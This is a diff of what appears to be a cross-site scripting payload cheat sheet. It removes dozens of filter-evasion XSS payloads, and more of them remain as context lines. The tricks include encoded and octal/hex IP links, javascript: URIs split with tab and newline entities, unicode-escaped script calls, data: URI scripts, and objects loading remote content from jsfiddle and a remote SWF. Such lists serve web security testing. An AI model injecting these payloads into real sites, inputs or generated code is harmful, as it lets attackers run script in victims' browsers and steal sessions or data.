@@ -4,11 +4,7 @@
 
 ```
 
-<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
-<A HREF="http://1113982867/">XSS</A>
-<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
-<A HREF="http://0102.0146.0007.00000223/">XSS</A>
-<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
@@ -76,26 +72,6 @@ http://www.google<script .com>alert(document.location)</script
 <input value=<><iframe/src=javascript:confirm(1)
 <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
 http://www.<script>alert(1)</script .com
-<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
-<svg><script ?>alert(1)
-<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
-<img src=`xx:xx`onerror=alert(1)>
-<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
-<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
-<svg contentScriptType=text/vbs><script>MsgBox+1
-<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
-<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
-<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
-<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
-<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
-<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
-<script>+-+-1-+-+alert(1)</script>
-<body/onload=&lt;!--&gt;&#10alert(1)>
-<script itworksinallbrowsers>/*<script* */alert(1)</script
-<img src ?itworksonchrome?\/onerror = alert(1)
-<svg><script>//&NewLine;confirm(1);</script </svg>
-<svg><script onlypossibleinopera:-)> alert(1)
+
 
 ```
